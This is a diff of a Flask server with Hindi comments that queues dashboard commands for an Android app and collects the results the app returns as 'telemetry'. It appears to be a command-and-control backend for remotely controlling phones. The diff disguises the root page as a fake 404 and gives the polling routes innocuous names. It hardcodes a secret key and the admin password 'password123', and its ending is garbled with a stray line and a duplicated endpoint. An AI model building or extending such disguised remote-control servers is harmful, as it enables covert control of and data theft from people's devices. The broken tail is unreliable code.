@@ -5,15 +5,14 @@ from flask import Flask, request, jsonify
 from flask_cors import CORS
 
 app = Flask(__name__)
-CORS(app)  # Cross-Origin Requests को अलाउ करने के लिए
+CORS(app)  # Cross-Origin Requests को अनुमति देने के लिए
 
 # Secret Key और Admin Credentials
 app.config['SECRET_KEY'] = 'SUPER_SECRET_STRONG_KEY_12345'
 ADMIN_USERNAME = "admin"
 ADMIN_PASSWORD = "password123"
 
-# इन-मेमोरी कमांड Queue (डैशबोर्ड से कमांड यहाँ स्टोर होगी और ऐप इसे फेच करेगा)
-# Format: { device_id: "command_string" }
+# इन-मेमोरी स्टोरेज (कमांड्स और रिजल्ट्स के लिए)
 pending_commands = {}
 device_telemetry_results = {}
 
@@ -24,14 +23,12 @@ def token_required(f):
         token = request.headers.get('Authorization')
         if not token:
             return jsonify({"status": "error", "message": "Token is missing!"}), 401
-        
         try:
             if token.startswith("Bearer "):
                 token = token.split(" ")[1]
-            data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=["HS256"])
-        except Exception as e:
+            jwt.decode(token, app.config['SECRET_KEY'], algorithms=["HS256"])
+        except Exception:
             return jsonify({"status": "error", "message": "Invalid or expired token!"}), 401
-            
         return f(*args, **kwargs)
     return decorated
 
@@ -40,10 +37,10 @@ def token_required(f):
 def home():
     return jsonify({
         "status": "error",
-        "message": "System Secure Gateway Active. Access Denied."
+        "message": "Access Denied. Resource Not Found."
     }), 404
 
-# --- 2. Login Endpoint (Dashboard के लिए)[span_8](start_span)[span_8](end_span) ---
+# --- 2. Login Endpoint (डैशबोर्ड के लिए) ---
 @app.route('/api/login', methods=['POST'])
 def login():
     data = request.get_json()
@@ -64,7 +61,7 @@ def login():
     
     return jsonify({"status": "error", "message": "Invalid Credentials"}), 401
 
-# --- 3. Command Execution Endpoint (डैशबोर्ड से कमांड भेजने के लिए)[span_9](start_span)[span_9](end_span) ---
+# --- 3. Command Execution Endpoint (डैशबोर्ड से कमांड भेजने के लिए) ---
 @app.route('/api/execute', methods=['POST'])
 @token_required
 def execute_command():
@@ -73,28 +70,26 @@ def execute_command():
         return jsonify({"status": "error", "message": "No command provided"}), 400
     
     command = data.get('command')
-    target_device_id = data.get('device_id', 'DEFAULT_DEVICE')
+    device_id = data.get('device_id', 'DEFAULT_DEVICE')
     
-    # कमांड को पेंडिंग queue में डालना ताकि एंड्रॉइड ऐप इसे उठा सके
-    pending_commands[target_device_id] = command
+    # कमांड को पेंडिंग queue में सेव करना ताकि ऐप इसे ले सके
+    pending_commands[device_id] = command
 
     return jsonify({
         "status": "success",
         "command_executed": command,
-        "target_device": target_device_id,
-        "message": "Command queued successfully for target device.",
+        "target_device": device_id,
+        "message": "Command queued successfully.",
         "timestamp": str(datetime.datetime.now())
     }), 200
 
-# --- 4. Android App Polling Endpoint (ApiClient.txt के मुताबिक)[span_10](start_span)[span_10](end_span) ---
-@app.route('/get-command', methods=['GET'])
-def get_command():
+# --- 4. Android App Command Fetch Endpoint (आपके लॉग्स के अनुसार सही राउट) ---
+@app.route('/api/v1/command/fetch', methods=['GET'])
+def fetch_command():
     device_id = request.args.get('device_id', 'DEFAULT_DEVICE')
-    
-    # चेक करें कि इस डिवाइस के लिए कोई कमांड पेंडिंग है या नहीं
     cmd = pending_commands.get(device_id, "none")
     
-    # एक बार कमांड भेजने के बाद उसे क्लियर कर देना ताकि बार-बार रिपीट न हो
+    # एक बार कमांड भेजने के बाद उसे क्लियर कर देना
     if cmd != "none":
         pending_commands[device_id] = "none"
 
@@ -103,30 +98,43 @@ def get_command():
         "status": "success"
     }), 200
 
-# --- 5. Android App Result Post Endpoint (ApiClient.txt के मुताबिक)[span_11](start_span)[span_11](end_span) ---
-@app.route('/post-result', methods=['POST'])
-def post_result():
+# --- 5. Android App Telemetry / Result Post Endpoint (आपके लॉग्स के अनुसार सही राउट) ---
+@app.route('/api/v1/telemetry', methods=['POST'])
+def post_telemetry():
     data = request.get_json()
     if not data:
         return jsonify({"status": "error", "message": "No data received"}), 400
         
-    device_id = data.get('device_id', 'UNKNOWN')
-    cmd = data.get('cmd', '')
-    result_data = data.get('result', '')
+    device_id = data.get('device_id', 'DEFAULT_DEVICE')
+    cmd = data.get('cmd', 'Unknown')
+    result_data = data.get('result', {})
     
-    # रिजल्ट को स्टोर करना ताकि डैशबोर्ड इसे देख सके
+    # रिजल्ट को स्टोर करना ताकि डैशबोर्ड इसे दिखा सके
     device_telemetry_results[device_id] = {
         "command": cmd,
         "result": result_data,
         "timestamp": str(datetime.datetime.now())
     }
-    
-    print(f"Received Result from [Device: {device_id}] for [Cmd: {cmd}] -> {result_data}")
 
     return jsonify({
         "status": "success",
-        "message": "Telemetry result saved successfully"
+        "message": "Telemetry received successfully"
     }), 200
+
+# --- 6. Fetch Latest Result Endpoint (डैशबोर्ड पर आउटपुट दिखाने के लिए) ---
+@app.route('/api/get-latest-result', methods=['GET'])
+@token_required
+def get_latest_result():
+    device_id = request.args.get('device_id', 'DEFAULT_DEVICE')
+    result = device_telemetry_results.get(device_id, {"info": "Awaiting device telemetry data..."})
+    return jsonify({
+        "status": "success",
+        "data": result
+    }), 200
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+0
 
 # --- 6. Fetch Latest Result Endpoint (डैशबोर्ड पर रिजल्ट दिखाने के लिए) ---
 @app.route('/api/get-latest-result', methods=['GET'])
